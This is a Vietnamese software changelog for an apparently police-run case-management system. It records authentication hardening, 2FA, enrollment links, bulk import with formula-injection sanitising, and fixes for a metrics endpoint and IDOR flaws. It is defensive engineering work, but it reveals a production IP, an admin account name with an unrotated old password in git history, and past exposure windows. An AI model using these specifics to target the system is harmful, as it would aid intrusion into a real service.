T2Đ1 reality (post-v0.26): workId required ở mọi flow tạo user, nhưng login form lại reject workId/phone/username vì `LoginDto.username` decorator `@IsEmail()` chặn ở NestJS ValidationPipe trước khi tới service. /autoplan Eng dual voices (Codex + Claude subagent) verdict BLOCK / NEEDS REVISION → mở rộng scope từ 1-line DTO → 6-file fix gồm canonicalization + timing oracle + audit metadata.

**Backend (auth + admin):**
- `login.dto.ts`: `@IsEmail()` → `@IsString() @MinLength(3) @MaxLength(254)`. Backend `classifyIdentifier()` shape-detect → route field-specific query (đã ship v0.24 nhưng bị DTO chặn).
- `identifier-classifier.ts`:
  - Expand `WORKID_PATTERN` để accept cả `XXX-XXX` (vd `277-794`) lẫn `PREFIX-PREFIX-NNN` (vd `PC02-DTV-001`) — legacy seed users login được.
  - Thêm `canonicalizeVietnamPhone()` — `0934...` / `84934...` / `+84934...` → `+84934...` canonical.
- `admin.service.ts` (createUserCore + updateUser): email `trim().toLowerCase()` + phone canonicalize TRƯỚC duplicate check và write. Mixed-case email không còn gây login fail.
- `auth.service.ts` login flow:
  - **Timing oracle defense**: non-existent/inactive user vẫn chạy `bcrypt.compare(password, DUMMY_BCRYPT_HASH)` để equalize timing ~80ms → prevent username enumeration via response timing.
  - **Unified error message**: locked account trả `Invalid credentials` thay vì leak "Tài khoản đã bị khoá tạm thời" — không leak lock state qua response body.
  - **Audit metadata rename**: `USER_LOGIN_FAILED` / `USER_LOGIN_LOCKED` audit log đổi từ `{ email: dto.username }` → `{ identifier: dto.username, shape: field }`. Forensic queries phản ánh đúng identifier shape.
  - Thêm action mới `USER_LOGIN_LOCKED_ATTEMPT` audit khi user attempt login lúc đang locked.

**Migration:**
- `prisma/migrations/20260519100000_canonicalize_email_phone/migration.sql`:
  - `UPDATE users SET email = LOWER(TRIM(email))` (idempotent).
  - Phone Vietnam canonicalize: strip separators, `0XXX` → `+84XXX`, `84XXX` → `+84XXX`, foreign digits → prepend `+`.
  - Idempotent: re-run an toàn.

**Tests:**
- New: `login.dto.spec.ts` (12 cases) — class-validator covers 4 shapes + bounds.
- Extended: `identifier-classifier.spec.ts` — PC02-DTV legacy format, phone canonicalization 4 variants.
- Extended: `admin.service.spec.ts` — email lowercase + phone canonicalize at write.
- Extended: `auth.service.spec.ts` — unified lock message, timing oracle dummy bcrypt, audit identifier+shape metadata.
- E2E: `auth.e2e.spec.ts` — login bằng username, invalid identifier 401, no enumeration leak.

Backend 1326 → **1351 PASS** (+25 cases). Frontend 484/484 unchanged. TS clean cả 2 stack.

**Frontend:** verify-only — zod `.min(3)` + `type="text"` + placeholder "Số hiệu / SĐT / email / tên đăng nhập" đã ready từ v0.24.

**Out-of-scope (defer):** phone DB index (N nhỏ), rate-limit per-identifier (Cloudflare layer), audit retroactive `metadata.email` migration, DTO field rename `username` → `identifier`.

**Security note:** Widening login attack surface (workId/phone/email/username) đã được audit và hardening đồng thời (timing oracle + unified message). NIST SP 800-63B accept-then-verify pattern.

## [0.26.0.0] - 2026-05-19

### Admin User Form — Mã cán bộ bắt buộc, Email optional

Thực tế T2Đ1: nhiều cán bộ không có email công vụ → email không nên là rào cản. Ngược lại, Mã cán bộ (workId / số hiệu ngành) là khóa định danh nội bộ duy nhất, BẮT BUỘC để định danh đúng cán bộ và liên kết hồ sơ. Áp dụng đồng nhất ở mọi flow tạo/sửa user.

**Backend (NestJS):**
- `create-user.dto.ts`: `workId` chuyển từ `@IsOptional()` sang `@IsNotEmpty()`. Email vẫn `@IsOptional()`.
- `update-user.dto.ts`: override `workId` required (PartialType làm field optional trở lại, cần override explicit) — admin edit user cũ cũng phải bổ sung workId (forced migration).
- `admin.service.ts` `createUserCore`: bỏ rule "≥1 trong workId/phone/email", thay bằng defensive check workId. Thêm duplicate workId check trong `updateUser` flow (parallel với email/username uniqueness).
- `bulk/bulk-import.service.ts`: row thiếu workId → push blocking error "Thiếu Mã cán bộ (workId) — bắt buộc". workId format hint (XXX-XXX) vẫn warn-only.
- `bulk/bulk-import.processor.ts`: `workId: row.workId!` (non-null assert, rows missing workId đã bị filter qua errors check trước đó).

**Frontend (React):**
- `UserManagementPage.tsx`: validation check `!formData.workId` thay cho `!formData.email`. Error message: "Vui lòng nhập Họ tên, Mã cán bộ, Tên đăng nhập." Label "Mã cán bộ *" có asterisk, label "Email" bỏ asterisk. Email rỗng gửi `undefined` (tránh `@IsEmail` reject empty string).
- `BulkImportWizard.tsx`: header column "Số hiệu *" + input cell border đỏ + tooltip "Mã cán bộ là bắt buộc" khi rỗng.

**Tests:**
- `admin.service.spec.ts`: thay test "rejects khi thiếu workId/phone/email" → "rejects khi thiếu workId". Thêm workId vào `createDto` base + tất cả updateUser test calls.
- `e2e/admin.e2e.spec.ts` + `uat/admin.uat.spec.ts`: thêm `#field-workId` fill ở tất cả create flow.

Backend 1326/1326 PASS, Frontend 484/484 PASS, TS clean cả 2 stack.

**Breaking UX:** Admin edit bất kỳ user cũ nào chưa có workId sẽ bị forced bổ sung. Đây là forced migration có chủ ý — không cần data migration script.

## [0.25.0.0] - 2026-05-16

### Onboarding — Bulk User Import + Fix Single-Create UI Broken (T2Đ1 5-min TTFU)

Sau v0.24.0.0 ship magic link enrollment, phát hiện 2 vấn đề ngay:
1. **Single-create UI broken trong prod**: backend đổi response `tempPassword` → `enrollment` nhưng frontend `UserManagementPage.tsx:282` vẫn ref `tempPassword` → modal hiện `undefined`. P0 bug — anh tạo single user không nhận được link.
2. **Manual onboarding 12+ cán bộ tốn thời gian**: gõ tay 12 user × 30s = ~6 phút admin work, nhân lên cho 5 tổ sau = TTFU không scalable.

Plan v0.25.0.0 — bulk import + UI fix trong cùng PR (autoplan reviewed, anh giữ MAX scope sau dual-voice premise gate):

**Backend (NestJS + Prisma):**
- Migration `20260516130000_add_bulk_import_jobs`: model `BulkImportJob` durable audit trail (source filename + SHA-256 + row outcomes JSON + file paths + 24h TTL)
- `bulk-import.parser.ts`: ExcelJS-based parser (xlsx + csv), header auto-detect tiếng Việt + English diacritics-insensitive, skip "Hướng dẫn" sheet, **`sanitizeForExcel()` chặn Excel formula injection** (prefix `'` cho cell `= + - @`)
- `bulk-import.service.ts`: validate per-row (≥1 workId/phone/email, dup check DB + batch, role/dept resolve, workId format hint), magic-byte check xlsx, file size 2MB / 100 row limit
- `bulk-import.processor.ts`: in-memory sequential queue (no Redis dependency), row-level transaction (split-brain safe), progress update DB realtime, gen enriched file + PDF ZIP (autoplan E5: accept pdfkit stall in single-VM context)
- `bulk-enrichment.writer.ts`: ExcelJS preserve column values + thêm 2 cột `Link đăng ký` + `Hết hạn`, formula sanitize applied
- `enrollment-pdf.service.ts`: pdfkit + Be Vietnam Pro font embed (140KB asset), QR code + URL fallback, A6 layout
- 5 endpoints: `POST /admin/users/bulk-import/preview`, `POST /admin/users/bulk-import/confirm`, `GET /admin/users/bulk-jobs/:id`, `GET .../enriched.xlsx`, `GET .../handover-pdfs.zip`, `GET /admin/users/bulk-import/template.xlsx`
- IDOR fix (autoplan E6): chỉ `generatedBy=actorId` download enriched/zip (admin role không bypass), audit `ENROLLMENT_LINKS_EXPORTED` mỗi GET với count + downloadCount tracking, Content-Disposition `attachment`
- `AdminService.createUserCore` extract (autoplan E4) — reuse single + bulk, transaction boundary explicit, bcrypt placeholder hash chỉ 1× per user

**Frontend (React + Vite):**
- `EnrollmentLinkModal.tsx` mới — replace `TempPasswordHandoverModal` cho create flow. URL + QR code + Copy button với **HTTP fallback** (input readonly + Ctrl+C khi `navigator.clipboard` unavailable trên prod HTTP), ESC blocked until acknowledged checkbox
- `BulkImportWizard.tsx` 4-step modal:
  - Step 1: drag-drop upload xlsx/csv + template download link
  - Step 2: preview table inline edit + per-row validation badges (lỗi/cảnh báo/OK) + summary strip "N dòng · M sẵn sàng · K lỗi"
  - Step 3: progress bar polling 2s → 8s backoff + Page Visibility pause + ARIA live
  - Step 4: **primary CTA "Tải Excel có sẵn link"** (zero-extra-step UX) + secondary ZIP PDF + reset button
- Desktop-only ≥768px (autoplan Design S3 decision)
- `UserManagementPage.tsx`: fix `tempPassword` → `enrollment` mapping, thêm button "Import Excel"
- `authedDownload()` helper: fetch với Bearer token (file binary endpoint không proxy được qua axios)

**Tests**: backend 1307 → **1326** (+19 parser tests: header VN/EN, formula sanitize, splitFullName, normalizePhone, sheet skip "Hướng dẫn"). Frontend 484/484 PASS. TS clean cả 2 stack.

**Security**: Excel formula injection blocked (`'` prefix), magic-byte xlsx validate, path traversal UUID check, IDOR audit + Content-Disposition, temp file `chmod 600` + 24h TTL.

**Deploy**: Redis KHÔNG cần (in-memory sequential queue thay BullMQ — giảm 1 dependency VM). Temp dir `/tmp/pc02-bulk/` permission 600. Be Vietnam Pro font 140KB ship qua tarball `backend/assets/fonts/`.

## [0.24.0.0] - 2026-05-16

### Onboarding — Magic Link Enrollment + Multi-Field Login (T2Đ1 unblock, NIST SP 800-63B compliant)

Phát hiện: file Excel T2Đ1 có 12 cán bộ Tổ 2 Đội 1, chỉ 5/12 có email công vụ (41%), 12/12 có phone. Hệ thống cũ yêu cầu email NOT NULL → admin không thể tạo user thiếu email. Mode B (bulk default password) vi phạm NIST SP 800-63B §5.1.1.1 (shared bcrypt hash cho batch user → fail audit ngành A05).

Plan v2 sau `/autoplan` dual-voice review (Claude subagent ×4):
- **Magic link** thay Mode B password — admin gen link 1-time, gửi qua bất kỳ channel nào (Zalo personal, SMS, email, in QR/PDF), user click → tự đặt password.
- **Multi-field login** với regex disambiguator — chống collision DoS attack (Eng review finding: User A `workId='0934314279'` + User B `phone='0934314279'` → `findFirst+OR` trả random user).

**Backend:**
- Schema: `email` nullable, `workId` `@unique` (partial index NOT NULL), thêm `enrollmentTokenHash`, `enrollmentExpiresAt`, model `EnrollmentTokenAudit` (track admin gen + user consume).
- `identifier-classifier.ts`: pure function classify input → `email`/`phone`/`workId`/`username` field, mỗi field 1 `findUnique`/`findFirst` lookup riêng.
- `EnrollmentService` (mới): `generateEnrollmentLink` (256-bit random token, bcrypt hash, TTL 72h, audit) + `consumeEnrollmentToken` (verify + bcrypt compare + transactional update + issue real TokenPair).
- `AdminService.createUser` replace `tempPassword` → auto-gen enrollment link, return `{ url, qrPayload, expiresAt }` cho admin copy/QR. Validate ≥1 trong (workId/phone/email).
- Endpoints: `POST /auth/enroll` (public, rate-limit 5/min), `POST /admin/users/:id/regenerate-enrollment-link` (admin auth).

**Frontend:**
- `EnrollPage` mới (route `/auth/enroll?token=...&uid=...`): form đặt password lần đầu, strength meter, redirect dashboard sau success.
- `LoginPage` label "Tài khoản đăng nhập" thay "Email / Số điện thoại", placeholder "Số hiệu / SĐT / email / tên đăng nhập", helper text, schema chấp nhận non-email.
- `authApi.enroll` API client.

**Tests**: backend Jest 1247 → 1307 (+60: identifier-classifier 13, EnrollmentService 15, AdminService createUser 7 mới, multi-field login 6, audit fixtures adjust). Frontend Vitest 484/484. TS clean.

**Security**: NIST SP 800-63B compliant — token plaintext KHÔNG BAO GIỜ lưu (chỉ bcrypt hash trên user record). User tự đặt password (strong meter), admin không biết. Replace Mode B violation.

## [0.23.1.0] - 2026-05-16

### Security HOTFIX — Metrics endpoint IP allowlist (defense-in-depth)

Phát hiện bởi `/qa` trên prod 2026-05-16: `GET http://171.244.40.245/api/v1/metrics` trả 200 cho mọi IP Internet → leak Prometheus internals (login attempts counter, CPU/memory, 2FA stats, audit log volume) cho attacker.

Root cause: Sprint 3 ship MetricsModule với chỉ 1 lớp protection (nginx `allow 127.0.0.1; deny all;`). Anh chưa apply nginx config mới lên VM → exposure window.

**Fix 2 lớp:**
- **App-level guard mới**: `MetricsIpAllowlistGuard` reject mọi request không từ 127.0.0.1/::1 (override qua env `METRICS_ALLOWED_IPS=10.0.0.5,10.0.0.6` cho Prometheus VM khác). Active ngay sau auto-deploy, không depend nginx.
- **VM ops parallel**: `scripts/deploy/hotfix-metrics-allowlist.sh` inject `location = /api/v1/metrics { allow 127.0.0.1; deny all; }` vào current nginx config (idempotent + backup).

**Tests**: 7 test mới cover IPv4 loopback, IPv6 ::1, IPv4-mapped IPv6, public IP reject, env override, empty IP defense.

Backend Jest: 1270/1270 PASS.

## [0.23.0.0] - 2026-05-15

### Security — Sprint 3 Operational Maturity (monitoring + off-site backup + CSP)

Sprint 3/3. Sau Sprint 1+2+3, hệ thống ở mức 9.5/10 — public-Internet ready.

**S3.3 — Prometheus Metrics + Self-hosted Monitoring Stack**
- New module `MetricsModule` (global), service exposes 5 counter + 1 histogram + default Node.js metrics. Endpoint `GET /api/v1/metrics`.
- Counters wired:
  - `pc02_login_attempts_total{result}`: success/failure/locked/2fa_setup_required
  - `pc02_data_scope_denial_total{resource}`: parent/creator (qua scope-filter.util)
  - `pc02_2fa_verify_total{method,result}`, `pc02_audit_log_total{action}` (chuẩn bị wire ở PR sau)
  - `pc02_http_request_duration_seconds`: P95 latency histogram
- Self-hosted stack docker-compose: Prometheus + Alertmanager + Loki + Grafana. Port nội bộ (127.0.0.1), access qua SSH tunnel. RAM ~500MB, $0/tháng.
- 7 alert rules: BackendDown, BruteForceLogin (+ Critical), HighDataScopeDenial, AccountLockoutSpike, HighRequestLatency, OffsiteBackupStale.

**S3.2 — Off-site Backup**
- `scripts/deploy/offsite-backup.sh`: rclone B2 sync `/var/backups/pc02/` lên Backblaze B2 hằng ngày 03:00. Retention 30 days. Cost ~$2/tháng (10GB). Write health metric vào textfile collector cho Prometheus pickup.
- Anh setup B2 account + rclone config 1 lần, cron tự chạy.

**S3.4 — CSP Tighten + Metrics IP Allowlist**
- nginx `Content-Security-Policy` thêm `report-uri /api/v1/csp-report` để track XSS attempts + legitimate breakage.
- Backend endpoint `POST /csp-report` (no auth, public per CSP spec) log violation reports.
- `Permissions-Policy` tighten: disable USB/Serial/Bluetooth/sensors/interest-cohort ngoài geo/camera/mic/payment đã có.
- nginx `location = /api/v1/metrics`: `allow 127.0.0.1; deny all;` — Prometheus container scrape OK, external 403.

**S3.5 — Documentation (4 file mới)**
- `docs/MONITORING.md`: setup stack + alert rules + Grafana access guide.
- `docs/BACKUP-OFFSITE.md`: B2 account setup + rclone config + cron + recovery procedure.
- `docs/KEY-ROTATION.md`: runbook cho JWT keypair, TOTP encryption, SMTP, DB password, GitHub secrets.
- `docs/SESSION-REGISTRY-FUTURE.md`: ghi rõ tại sao S3.1 (UserSession registry) defer + plan đầy đủ cho PR riêng.

### Deferred ra PR riêng — em không build vì risk regression auth core

- **S3.1 UserSession registry** (per-device session management, admin force-logout 1 device). Refactor refresh-token rotation flow. Plan trong `docs/SESSION-REGISTRY-FUTURE.md`. Sprint 2 logout endpoint + tokenVersion đã đủ secure cho launch — đây là UX improvement.
- **CSP nonce-based** (loại bỏ `'unsafe-inline'` cho style). Cần modify Vite build + verify toàn UI không break. CSP report-uri sẽ catch nếu có violation.

### Anh cần làm sau khi merge

1. **Monitoring stack** (1 lần, ~15 phút):
   ```bash
   ssh pc02vm
   cd /home/pc02/current/scripts/monitoring
   cp .env.example .env  # edit GRAFANA_ADMIN_PASSWORD
   nano alertmanager.yml  # SMTP creds + admin email
   sudo docker compose up -d
   ```
2. **Off-site backup** (~20 phút setup):
   - Tạo Backblaze account + bucket private + Application Key.
   - `sudo apt install rclone && rclone config` (paste B2 keyID/appKey).
   - Cài cron: `sudo cp scripts/deploy/offsite-backup.sh /home/pc02/bin/` + cron entry.
   - Chi tiết: `docs/BACKUP-OFFSITE.md`.
3. **Re-apply nginx config** (CSP report-uri + metrics IP allowlist + Permissions-Policy):
   ```bash
   sudo ~/install-nginx-config.sh <domain>
   ```

### Tests
- Backend Jest: 1263/1263 PASS (Sprint 3 không thay đổi test count)
- Frontend Vitest: 484/484 PASS

## [0.22.0.0] - 2026-05-15

### Security — Sprint 2 Public-Launch Hardening (audit + 2FA mandate + logout + MIME)

Sprint 2/3 trên roadmap. Đóng audit trail + auth maturity gaps trước khi public.

**S2.4 — 2FA Setup Mandate (cho TOÀN BỘ user)**
- Schema mới: `users.twoFaSetupRequired` (default `true` cho user mới, `false` cho user cũ qua migration). Seed admin = `false`.
- Token type mới: `TOKEN_TYPE.TWO_FA_SETUP_PENDING = '2fa_setup_pending'`. Sống 15 phút, bind to tokenVersion, JwtStrategy reject làm access token.
- Login flow mới: nếu `!totpEnabled && (TWO_FA_ENABLED || twoFaSetupRequired)` → return `{ pending: true, twoFaSetupToken, reason: 'TWO_FA_SETUP_REQUIRED' }`.
- Guard mới: `TwoFaSetupTokenGuard` (tương tự `TwoFaTokenGuard` nhưng check type=`2fa_setup_pending`, không single-use).
- 2 endpoint mới gated by setup token:
  - `POST /auth/2fa/initial-setup` — wrap setupTotp() trả QR + backup codes.
  - `POST /auth/2fa/initial-setup/verify` — verify first OTP, enable totp, clear `twoFaSetupRequired`, trả TokenPair (login flow hoàn tất).
- Audit log mới: `USER_2FA_SETUP_REQUIRED` khi login fire setup-pending; `USER_2FA_INITIAL_SETUP_COMPLETED` khi user xong.
- 4 test mới cho login mandate flow.

**S2.3 — Backend Logout Endpoint**
- `POST /auth/logout` (gated by `JwtAuthGuard`): clear `user.refreshTokenHash` → refresh token cũ không refresh được nữa. Server-side revocation thay cho frontend-only clear localStorage.
- Audit log `USER_LOGOUT` với ip + user agent.
- Frontend `MainLayout.handleLogout` gọi backend trước khi clear local tokens (best-effort try/catch).
- 3 test backend.

**S2.2 — Magic-byte MIME Validation**
- Dependency mới: `file-type` (ESM-only — dùng dynamic import).
- `POST /documents` upload: sau khi multer ghi file, đọc magic bytes thật. Nếu detected MIME không khớp `ALLOWED_MIME_TYPES` → xoá file giả mạo + throw 400.
- Bypass cho `text/plain` (no magic bytes).
- Protect: attacker upload `.html` đặt Content-Type=image/png không còn bypass whitelist.

**S2.1 — Audit Log Additions**
- `DOCUMENT_DOWNLOADED`: log khi user download tài liệu (fileName + mimeType + size + ip + UA).
- `CASE_EXPORTED`: log khi user export vụ án ward Excel.
- `INCIDENT_EXPORTED`: log khi user export vụ việc ward Excel.
- Petitions đã có `PETITION_EXPORTED` từ trước.
- Admin actions đã cover đầy đủ (USER_CREATED/UPDATED/DELETED, ADMIN_PASSWORD_RESET, ROLE_PERMISSIONS_UPDATED, DATA_GRANT_CREATED/REVOKED, ADMIN_2FA_RESET).

### Anh cần làm sau khi merge

1. Migration `20260515070000_add_2fa_setup_required` tự apply qua prisma migrate deploy.
2. Bật `TWO_FA_ENABLED=true` trong settings (qua admin UI hoặc psql) khi sẵn sàng force toàn bộ user setup 2FA.
3. Khi user login lần tới, frontend cần handle `reason: 'TWO_FA_SETUP_REQUIRED'` → redirect /auth/2fa-setup. **Frontend page cho initial setup flow chưa làm — em ship backend trước, frontend wire-up có thể làm sau** (tạm thời user bị stuck ở response nếu chưa có UI page).

### Tests
- Backend Jest: 1263/1263 PASS (+7 mới: 4 mandate + 3 logout)
- Frontend Vitest: 484/484 PASS

## [0.21.9.0] - 2026-05-15

### Security — Sprint 1 Public-Launch Hardening (4 hạng mục)

Sprint 1/3 trên roadmap "Public Internet Readiness". Mục tiêu: từ 7.5/10 (internal-VPN-ready) lên ngưỡng đủ để mở Internet (still cần Sprint 2+3 cho audit/session/monitoring).

**S1.2 — Account Lockout**
- Schema mới: `users.failedLoginAttempts`, `lockedUntil`, `lastFailedLoginAt` (migration `20260515060000_add_account_lockout_fields`).
- Login fail 5 lần liên tiếp → khoá 15 phút. Locked user bị reject TRƯỚC khi bcrypt.compare chạy (không leak timing info phân biệt locked vs wrong-pw).
- Audit log mới: `USER_LOGIN_LOCKED` khi threshold trigger; `USER_LOGIN_FAILED` giữ nguyên cho fail thường.
- Success login reset counter + clear lockout state.
- Constants: `MAX_FAILED_LOGIN_ATTEMPTS=5`, `LOCKOUT_DURATION_MS=15*60*1000` trong `auth-policy.constants.ts`.
- 6 test mới (RED→GREEN): increment counter, lock trigger, audit fire, locked reject, expire reset, success reset.

**S1.3 — File Upload Throttle**
- `POST /api/v1/documents` thêm `@Throttle({ default: { ttl: 60000, limit: 10 } })` chống storage abuse (1000 file × 10MB = 10GB nếu không cap).
- 1 reflection test verify metadata còn nguyên (prevent regression).

**S1.4 — 2FA Verify Throttle (regression tests)**
- `/auth/2fa/verify` đã có `limit: 5/min` + `/auth/2fa/send-email-otp` đã có `limit: 3/min` — em add 2 reflection test để prevent regression.
- Tính brute-force: 5/min × 6-digit OTP (1M space) × 10-min TTL = 0.005% chance success.

**S1.1 — nginx Golden Template + S1.5 — Deploy artifacts**
- File mới `scripts/deploy/nginx-pc02.conf`: production-grade nginx config với TLS, HSTS preload, CSP, X-Frame-Options DENY, Permissions-Policy, rate-limit zones (api 10r/s, login 3r/s), `client_max_body_size 25M`, immutable cache cho hashed assets.
- File mới `scripts/deploy/install-nginx-config.sh`: idempotent installer — backup config cũ, render template với domain, validate `nginx -t`, reload, health check.
- File mới `docs/PUBLIC-LAUNCH.md`: full step-by-step guide cho anh: certbot, install nginx, migration verify, 6 acceptance tests (TLS, headers, lockout, rate limit, upload throttle, request size cap), rollback procedure.

### Anh cần làm tay sau khi merge

1. Trỏ A record domain về `171.244.40.245`.
2. `ssh pc02vm` rồi `sudo certbot --nginx -d <domain> --redirect` cấp Let's Encrypt.
3. Copy + chạy `scripts/deploy/install-nginx-config.sh <domain>` để apply config.
4. Verify SSL Labs A + securityheaders.com A+.
5. Rotate password `admin@pc02.local` (lần CUỐI cùng plaintext qua mạng — sau khi TLS lên thì sang HTTPS).
6. (Optional) Scrub git history password cũ bằng `git filter-repo`.

### Tests
- Backend Jest: 1256/1256 PASS (+9 mới)
- Frontend Vitest: 484/484 PASS (4 jsdom errors pre-existing)

## [0.21.8.0] - 2026-05-15

### Security — CSO hardening pass (1 CRITICAL + 3 HIGH + 6 MEDIUM + 2 LOW)

Em chạy `/cso` audit toàn bộ source, fix 12 finding code-fixable trong 1 PR. Tests: backend 1247/1247, frontend 484/484 — tất cả PASS.

**CRITICAL — Admin password leak**
- Xoá password hardcoded `admin@pc02.local` khỏi `docs/take-screenshots.js`, `run_maestro.bat`, `run_qa_smoke.bat`. Cả 3 script giờ require env var `SCREENSHOT_PASSWORD` / `TEST_PASSWORD`, fail fast nếu không set.
- **Anh cần làm tay**: rotate password `admin@pc02.local` trên VM ngay (password cũ vẫn còn trong git history, em không scrub history theo yêu cầu của anh).

**HIGH — IDOR (Broken Access Control) trên 2 module shared**
- `action-plans` và `vks-meetings` bỏ DataScope khi rollout phạm vi dữ liệu trước đó. Investigator Tổ A có thể đọc/tạo/xoá plans + biên bản VKS của Tổ B.
- Inject `dataScope` từ `ScopedRequest`, gọi `assertParentInScope(parent, scope, 'read'|'write')` ở mọi CRUD operation. `delete()` load parent qua include rồi check trước khi xoá. Admin (null scope) bypass như cũ.
- 13 test mới (RED→GREEN) cover cross-team deny + matching team allow + admin bypass.

**HIGH — Production missing TLS + security headers**
- `frontend/nginx.conf`: thêm `X-Content-Type-Options: nosniff`, `X-Frame-Options: DENY`, `Referrer-Policy: strict-origin-when-cross-origin`, `client_max_body_size 25M`. HSTS + rate-limit (commented sẵn để bật khi có TLS cert).
- Backend `main.ts`: cài `helmet` với CSP=false (API trả JSON, frontend riêng), HSTS 1 năm, `crossOriginResourcePolicy: same-site`.
- **Anh cần làm tay**: cấp Let's Encrypt cert + force HTTPS trên VM.

**MEDIUM — XSS injection points**
- `frontend/src/lib/html-escape.ts`: util mới với 6 test case (escape `& < > " '`, null-safe, double-encode protection).
- `ExportReportsPage.tsx:309`: print receipt giờ escape `receiverName`, `delivererName`, `content`, `receiptNumber`, `receiptDate` trước khi `document.write`.
- `email.service.ts`: HTML email `sendEventReminder` escape `eventTitle` + `dateStr` chống injection via calendar event title.

**MEDIUM — Infra hardening**
- `scripts/deploy/deploy.sh`: pg_dump backup giờ `chmod 600` + dir `chmod 700` (backups chứa PII + TOTP secrets).
- `backend/docker-entrypoint.sh`: `db:seed` chỉ chạy khi `RUN_SEED=true` (trước đây chạy mọi container restart — có thể reset admin password về seed value).

**LOW — Defense-in-depth**
- 4 call site `bcrypt.hash(refreshToken, 10)` (auth.service.ts × 3, two-fa.service.ts × 1) → `bcrypt.hash(refreshToken, getBcryptCost())` để consistent với password hash cost 12.
- 2 call site `Math.random()` cho upload filename suffix → `crypto.randomBytes(8).toString('hex')` (128-bit entropy unguessable).

### Cleared by CSO — không phải finding
- npm audit backend + frontend: **0 CVE**
- CI/CD workflows SHA-pinned, minimal permissions, no `pull_request_target`
- JWT RS256 với public/private PEM, tokenVersion-based revocation, refresh-token rotation + reuse detection
- 2FA TOTP atomic replay protection, OTP single-use constant-time compare
- Document upload: MIME whitelist + 10MB cap + filename rewritten server-side
- Không dùng LLM API, không có webhook receiver, không có raw SQL injection vector

## [0.21.7.0] - 2026-05-14

### Fixed — Calendar UI: phân loại Lịch/Sự kiện + sidebar context + delete dialog

Anh kiểm tra UI `/calendar` sau v0.21.6.0 và phát hiện 3 vấn đề UX. v0.21.7.0 fix cả 3 trong 1 PR.

**Bug 1 — Phân loại 2 levels**
Hiện chỉ có scope filter (Hệ thống/Tổ/Cá nhân) — trộn ngày lễ định kỳ với event công việc cùng một bucket. Thêm:
- Top-level **kind toggle "Tất cả / Lịch / Sự kiện"** trên cùng calendar
  - Lịch = `type='holiday'` OR `(type='event' AND scope='SYSTEM')`
  - Sự kiện = deadline/hearing/meeting/other OR (type='event' AND scope IN TEAM/PERSONAL)
- **Category filter chips** song song với scope chips: Quốc gia (đỏ) / Công an (xanh navy) / Quân đội (xanh lá) / Quốc tế (cam) / Khác. Bypass cho legacy events (không có categorySlug).

**Bug 2 — Sidebar "Sự kiện sắp tới" bổ sung context**
Mỗi item trong sidebar giờ hiển thị:
- Category badge (màu theo `categoryColor` từ API)
- Scope label: 🏛️ Toàn cơ quan / 👥 Cấp tổ / 🧑 Cá nhân
- Time (nếu `allDay=false`): "08:30–10:00"
- Recurring icon 🔁 nếu event lặp lại hằng năm

**Bug 3 — Delete dialog enriched context**
Click event ở sidebar mở `RecurringDeleteDialog` với đầy đủ thông tin trước khi confirm xóa:
- Category badge color-coded
- Scope label
- Time range
- Description (line-clamp-3)
- Recurring warning

Anh đã chốt qua AskUserQuestion: giữ flow click→popup-xóa, KHÔNG tạo modal xem chi tiết riêng.

**Implementation**
- `backend/src/calendar/calendar.service.ts` — response thêm `categoryName`, `allDay`, `startTime`, `endTime`, `isRecurring`. Additive, không breaking.
- `frontend/src/pages/calendar/utils/filterEvents.ts` — NEW pure function (12 unit tests pin logic).
- `frontend/src/pages/calendar/CalendarPage.tsx` — kindFilter + categoryFilter state, toggleCategory, UI chips, sidebar enrichment, handleEventClick pass full event.
- `frontend/src/pages/calendar/components/RecurringDeleteDialog.tsx` — 7 new optional props + conditional rendering (11 unit tests).

**Tests**
- 12 new unit tests cho `filterEvents` (kind, category, combined)
- 11 new component tests cho `RecurringDeleteDialog` (all fields + graceful omit)
- 2 new backend service tests (response shape includes new fields, isRecurring derivation)
- Total: 478/478 frontend + 1230/1230 backend pass.

---

## [0.21.6.0] - 2026-05-14

### Added — 12 ngày lễ + truyền thống Việt Nam còn thiếu trong calendar

Migration cũ đã seed 25 events (Tết, Quốc khánh, các ngày phổ biến) nhưng còn thiếu nhiều ngày quan trọng anh chỉ ra. v0.21.6.0 bổ sung 12 events đã verify từ nguồn chính thức (qdnd.vn, congan.*.gov.vn, baochinhphu.vn) — không invent dates.

**National — Quốc gia** (5 mới):
- 3/2 Ngày thành lập Đảng Cộng sản Việt Nam (1930)
- 26/3 Ngày thành lập Đoàn TNCS Hồ Chí Minh (1931)
- 19/5 Ngày sinh Chủ tịch Hồ Chí Minh (1890)
- 28/6 Ngày Gia đình Việt Nam (QĐ 72/2001/QĐ-TTg)
- 10/10 Ngày Giải phóng Thủ đô Hà Nội (1954)

**Police — Công An** (3 mới, ngoài 7 events đã có):
- 15/4 Ngày truyền thống Cảnh sát Cơ động (1974, Luật CSCĐ công nhận)
- 26/6 Ngày Toàn dân Phòng chống Ma túy (QĐ 93/2001/QĐ-TTg)
- 10/8 Ngày truyền thống lực lượng Cảnh sát Kinh tế (1956, Thông tư 1001/TTg)

**Military — Quân đội** (4 mới, ngoài 6 events đã có):
- 19/3 Ngày truyền thống Bộ đội Đặc công (1967)
- 29/6 Ngày truyền thống Binh chủng Pháo binh (1946)
- 11/7 Ngày truyền thống ngành Hậu cần Quân đội (Sắc lệnh 121/SL của Bác Hồ, 1950)
- 23/9 Ngày Nam Bộ Kháng chiến (1945)

**Implementation**
- `prisma/seed-vn-events.ts` — VN_EVENTS array + `seedVnEvents()` upsert function (idempotent, deterministic ID `evt_*`)
- `prisma/seed-vn-events-runner.ts` — standalone runner, không cần SEED_ADMIN_PASSWORD env var
- `npm run db:seed:events` — chạy riêng VN events seed
- Main `npm run db:seed` cũng include VN events (wired vào main seed.ts)
- 9 unit tests guard registry (uniqueness, format, category coverage, anchor events)

**Operational**
Sau khi v0.21.6.0 deploy, chạy:
```bash
ssh pc02vm 'cd /home/pc02/current/backend && DATABASE_URL=$(grep DATABASE_URL /home/pc02/shared/.env | cut -d= -f2-) npm run db:seed:events'
```

Idempotent — re-run an toàn, không tạo duplicate. Mỗi event recurring FREQ=YEARLY tự lặp mọi năm sau.

---

## [0.21.5.0] - 2026-05-14

### Fixed — Deploy bundle thiếu backend/src → seed script fail trên prod

v0.21.4.0 ship `seed-permissions.ts` vào prisma/ (chỗ deploy bundle có ship). Em tưởng đã đủ. Nhưng khi chạy `npm run db:seed` trên VM thì lỗi khác xuất hiện ở step kế tiếp:

```
prisma/seed-feature-flags.ts(18): Cannot find module '../src/feature-flags/feature-registry'
```

